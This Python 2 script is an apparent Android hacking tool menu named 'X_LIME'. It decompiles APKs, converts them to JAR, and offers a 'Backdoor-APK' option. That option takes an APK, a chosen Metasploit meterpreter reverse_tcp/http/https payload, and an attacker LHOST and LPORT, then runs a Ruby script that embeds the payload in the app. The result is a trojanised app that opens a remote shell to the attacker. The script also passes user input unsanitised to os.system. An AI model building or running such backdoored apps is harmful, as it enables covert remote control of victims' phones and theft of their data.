#!/usr/bin/python
# -*- coding: utf-8 -*-
import os
import subprocess
import shutil
import sys
import time
import progressbar
import time

from termcolor import colored
from termcolor import cprint
from colorama import init
from pyfiglet import figlet_format

init(strip=not sys.stdout.isatty())
#Symbols 
x1 = '\033[1;32m1\033[1;m'#1
x2 = '\033[1;32m2\033[1;m'#2
x3 = '\033[1;32m3\033[1;m'#3
x4 = '\033[1;32m4\033[1;m'#4
x5 = '\033[1;32m5\033[1;m'#5
x6 = '\033[1;32m6\033[1;m'#6
x0 = '\033[1;32m0\033[1;m'#0
a1_sign = '\033[1;37m[\033[1;m'
a2_sign = '\033[1;37m]\033[1;m'
d_sign = '\033[1;37m[\033[1;m''\033[1;32m--\033[1;m''\033[1;37m]\033[1;m'
d1_sign = '\033[1;37m[\033[1;m''\033[1;32m-\033[1;m''\033[1;37m]\033[1;m'
d_sign1 = '\033[1;37m: \033[1;m'
d_sign2 = '\033[1;37m[\033[1;m''\033[1;31mXX\033[1;m''\033[1;37m]\033[1;m'

#Choice 1 apk
dir_path = os.path.dirname(os.path.realpath(__file__))
c_dir_path = colored(dir_path, 'red', attrs=['bold'])
apk_directory = colored('Move the apk file to this dircetory and Enter the name of the apk', 'green', attrs=['bold'])
alone = colored('(alone)', 'red', attrs=['bold']) 
apk_enter = colored('Enter the name of the apk ⬎', 'green', attrs=['bold'])
choose_directory = colored('Enter the apk dircetory ⬎', 'green', attrs=['bold'])    
exampe = colored('/root/Desktop/myapk.apk', 'red', attrs=['bold'])  
clear = lambda: os.system('cls')
eg = colored('eg:(', 'green', attrs=['bold'])
eg_2 = colored(')', 'green', attrs=['bold'])
back = colored('Go Back', 'blue', attrs=['bold'])
b1_sign = colored('(', 'red', attrs=['bold'])
b2_sign = colored(')', 'red', attrs=['bold'])

def cls():
	os.system('cls' if os.name=='nt' else 'clear')
pass

def hacking():
    print colored('            ======================================================            ', 'green', attrs=['bold'])	
    print colored('            ██╗  ██╗ █████╗  ██████╗██╗  ██╗██╗███╗   ██╗ ██████╗             ', 'red', attrs=['bold'])
    print colored('            ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██║████╗  ██║██╔════╝             ', 'red', attrs=['bold'])
    print colored('            ███████║███████║██║     █████╔╝ ██║██╔██╗ ██║██║  ███╗            ', 'red', attrs=['bold'])
    print colored('            ██╔══██║██╔══██║██║     ██╔═██╗ ██║██║╚██╗██║██║   ██║            ', 'red', attrs=['bold'])
    print colored('            ██║  ██║██║  ██║╚██████╗██║  ██╗██║██║ ╚████║╚██████╔╝            ', 'red', attrs=['bold'])
    print colored('            ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝             ', 'red', attrs=['bold'])
    print colored('            ======================================================            ', 'green', attrs=['bold'])
pass

cls()
hacking()

def c_print(s):
	os_size = int(subprocess.check_output(['stty', 'size']).split()[1])
pass

def space():
	print("")
pass

cls()
def derp():
    print("          ─────────▄▄───────────────────▄▄──")
    print("          ──────────▀█───────────────────▀█─")
    print("          ──────────▄█───────────────────▄█─")
    print("          ──█████████▀───────────█████████▀─")
    print("          ───▄██████▄─────────────▄██████▄──")
    print("          ─▄██▀────▀██▄─────────▄██▀────▀██▄")
    print("          ─██────────██─────────██────────██")
    print("          ─██───██───██─────────██───██───██")
    print("          ─██────────██─────────██────────██")
    print("          ──██▄────▄██───────────██▄────▄██─")
    print("          ───▀██████▀─────────────▀██████▀──")
    print("          ──────────────────────────────────")
    print("          ──────────────────────────────────")
    print("          ──────────────────────────────────")
    print("          ───────────█████████████──────────")
    print("          ──────────────────────────────────")
    print("          ──────────────────────────────────")
pass
def Bunny():
    print("........▓▓▓▓.......................................")
    print("......▓▓......▓....................................")
    print("......▓▓......▓▓..................▓▓▓▓.............")
    print("......▓▓......▓▓..............▓▓......▓▓▓▓.........")
    print("......▓▓....▓▓..............▓......▓▓......▓▓......")
    print("........▓▓....▓............▓....▓▓....▓▓▓....▓▓....")
    print("..........▓▓....▓........▓....▓▓..........▓▓...▓...")
    print("............▓▓..▓▓....▓▓..▓▓................▓▓.....")
    print("............▓▓......▓▓....▓▓.......................")
    print("...........▓......................▓................")
    print(".........▓.........................▓...............")
    print("........▓......^..........^......▓.................")
    print("........▓............❤............▓................")
    print("........▓..........................▓...............")
    print("..........▓..........ٮ..........▓..................")
    print("..............▓▓..........▓▓.......................")
pass
def Hello():
    print("▒▒▒▒▒▒▒█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█")
    print("▒▒▒▒▒▒▒█░▒▒▒▒▒▒▒▓▒▒▓▒▒▒▒▒▒▒░█")
    print("▒▒▒▒▒▒▒█░▒▒▓▒▒▒▒▒▒▒▒▒▄▄▒▓▒▒░█░▄▄")
    print("▒▒▄▀▀▄▄█░▒▒▒▒▒▒▓▒▒▒▒█░░▀▄▄▄▄▄▀░░█")
    print("▒▒█░░░░█░▒▒▒▒▒▒▒▒▒▒▒█░░░░░░░░░░░█")
    print("▒▒▒▀▀▄▄█░▒▒▒▒▓▒▒▒▓▒█░░░█▒░░░░█▒░░█")
    print("▒▒▒▒▒▒▒█░▒▓▒▒▒▒▓▒▒▒█░░░░░░░▀░░░░░█")
    print("▒▒▒▒▒▄▄█░▒▒▒▓▒▒▒▒▒▒▒█░░█▄▄█▄▄█░░█")
    print("▒▒▒▒█░░░█▄▄▄▄▄▄▄▄▄▄█░█▄▄▄▄▄▄▄▄▄█")
    print("▒▒▒▒█▄▄█░░█▄▄█░░░░░░█▄▄█░░█▄▄█")
    pass

def payload1():
    print '\033[1;38m(1)android/meterpreter/reverse_tcp\033[1;m'
    print '\033[1;38m(2)android/meterpreter/reverse_http\033[1;m'
    print '\033[1;38m(3)android/meterpreter/reverse_https\033[1;m'
pass

def terminal_resize1():
    subprocess.call(['/usr/bin/resize', '-s', '16', '48'])
pass
def terminal_resize2():
    subprocess.call(['/usr/bin/resize', '-s', '9', '78'])
pass

def terminal_resize3():
    subprocess.call(['/usr/bin/resize', '-s', '23', '53'])
pass

def terminal_resize4():
    subprocess.call(['/usr/bin/resize', '-s', '21', '51'])
pass

def terminal_resize5():
    subprocess.call(['/usr/bin/resize', '-s', '14', '34'])  
    pass
def terminal_resize6():
    subprocess.call(['/usr/bin/resize', '-s', '27', '93'])
    pass
def terminal_resize7():
    subprocess.call(['/usr/bin/resize', '-s', '18', '49'])
    pass
def terminal_resize8():
    subprocess.call(['/usr/bin/resize', '-s', '14', '38'])
    pass

def start_textart():
    while '1'=='1':
        cls()
        terminal_resize1()
        print colored('================================================', 'red', attrs=['bold'])
        print colored(' ##:::: ##: ##::::::: ####: ##:::: ##: ########:', 'green', attrs=['bold'])
        print colored('. ##:: ##:: ##:::::::. ##:: ###:: ###: ##.....::', 'green', attrs=['bold'])
        print colored(':. ## ##::: ##:::::::: ##:: #### ####: ##:::::::', 'green', attrs=['bold'])
        print colored('::. ###:::: ##:::::::: ##:: ## ### ##: ######:::', 'green', attrs=['bold'])
        print colored(':: ## ##::: ##:::::::: ##:: ##. #: ##: ##...::::', 'green', attrs=['bold'])
        print colored(': ##:. ##:: ##:::::::: ##:: ##:.:: ##: ##:::::::', 'green', attrs=['bold'])
        print colored(' ##:::. ##: ########: ####: ##:::: ##: ########:', 'green', attrs=['bold'])
        print colored('..:::::..::........::....::..:::::..::........::', 'green', attrs=['bold'])
        print colored('====================', 'red', attrs=['bold']), colored('X_LIME', 'blue', attrs=['bold']), colored('====================', 'red', attrs=['bold'])
        print (d_sign + '\033[1;33mSELECT AN OPTION TO BEGIN: \033[1;m')
        print (a1_sign + x1 + a2_sign + '\033[1;32m Decomplie apk\033[1;m')
        print (a1_sign + x2 + a2_sign + '\033[1;32m Backdoor-APK\033[1;m')
        print (a1_sign + x3 + a2_sign + '\033[1;32m Apk-2-Jar\033[1;m')
        print (a1_sign + x4 + a2_sign + '\033[1;32m Exit\033[1;m')
        choice_1 = raw_input(d_sign1)

        while choice_1 == '1':
            terminal_resize3()
            print colored('▂▂▃▃▄▄▅▅▆▆▇▇██▓▓▒▒░░APK DECOMPILE░░▒▒▓▓██▇▇▆▆▅▅▄▄▃▃▂▂', 'red', attrs=['bold'])
            derp()
            print('                            ' + d_sign + 'OPTIONS' + d_sign)
            #print(d_sign + apk_directory + alone)
            print(d1_sign + choose_directory)
            print(d1_sign + eg + exampe + eg_2)
            print (a1_sign + x0 + a2_sign + back)
            apk_file = raw_input(d_sign1)
            if apk_file.endswith('.apk'):
                    os.system('apktool d '+apk_file)
                    raw_input("Press Enter to continue...")
            elif apk_file == '0':
                    start_textart()
                    pass
            else:
                    print (d_sign2), colored('Wrong file format!!!!', 'red', attrs=['reverse', 'bold'])
                    raw_input("Press Enter to continue...")
        pass
    
        
        while choice_1 == '2':
            terminal_resize5()
            cls()
            Hello()
            print(d1_sign + choose_directory)
            print(d1_sign + eg + exampe + eg_2)
            print (a1_sign + x0 + a2_sign + back)
            apk_file = raw_input(d_sign1)
            if apk_file.endswith('.apk'):
                    terminal_resize8()
                    cls()
                    payload1()
                    P = raw_input("Payload" +d_sign1)
                    if P == '1':
                        P = 'android/meterpreter/reverse_tcp'
                    elif P == '2':
                        P = 'android/meterpreter/reverse_http'
                    elif P == '3':
                        P = 'android/meterpreter/reverse_https'
                    else:
                        print (d_sign2), colored('Error', 'red', attrs=['reverse', 'bold'])
                        raw_input("Press Enter to continue...")
                        pass
                    pass

                    cls()
                    print('         ' + d_sign + 'OPTIONS' + d_sign)
                    LHOST = raw_input(" LHOST="+d_sign1)
                    LPORT = raw_input(" LPORT="+d_sign1)
                    cls()
                    terminal_resize6()
                    cls()
                    os.system("ruby Assest/apk-embed-payload.rb "+ apk_file + " LHOST="+LHOST + " LPORT="+LPORT + " -p "+P)
                    raw_input("Press Enter to continue...")
                    terminal_resize7()
                    cls()
                    folder = raw_input(d1_sign +'Folder Name'+ d_sign1)
                    os.system('mkdir Assest/' + folder)
                    os.system('mv original*' + ' Assest/' +folder)
                    os.system('mv payload*' + ' Assest/' +folder)
                    os.system('mv root*' + ' Assest/' +folder)
                    print('The output file will be in Assest/' + folder)
                    raw_input("Press Enter to continue...")
            elif apk_file == '0':
                    start_textart()
                    pass
            elif apk_file == '1':
                    print("PASS!!!!")
                    raw_input("Press Enter to continue...")
            else:
                    print (d_sign2), colored('Wrong file format!!!!', 'red', attrs=['reverse', 'bold'])
                    raw_input("Press Enter to continue...")
        pass

        cls()
        while choice_1 =='3':
            terminal_resize4()
            print colored('▂▂▃▃▄▄▅▅▆▆▇▇██▓▓▒▒░░!APK-2-JAR!░░▒▒▓▓██▇▇▆▆▅▅▄▄▃▃▂▂', 'red', attrs=['bold'])
            Bunny()
            print(d1_sign + choose_directory)    
            print(d1_sign + eg + exampe + eg_2)
            print (a1_sign + x0 + a2_sign + back)
            apk_file = raw_input(d_sign1)
            if apk_file.endswith('.apk'):
                    os.system('d2j-dex2jar ' + apk_file)
                    raw_input("Press Enter to continue...")
            elif apk_file == '0':
                    start_textart()
                    pass
            else:
                print (d_sign2), colored('Wrong file format!!!!', 'red', attrs=['reverse', 'bold'])
                raw_input("Press Enter to continue...")
        pass

        cls()
        while choice_1 == '4':
            sys.exit()
            cls()
            pass
pass

def Loading():
	with progressbar.ProgressBar(max_value=30) as bar:
		for i in range(30):
			time.sleep(0.1)
			bar.update(i)
		pass
	pass
pass

def terminal_launch():
    os.system('gnome-terminal --hide-menubar')
pass

cls()
terminal_resize2()
hacking()
Loading()   
cls()
terminal_resize1()
while start_textart():
    terminal_resize3()
    cls()
pass
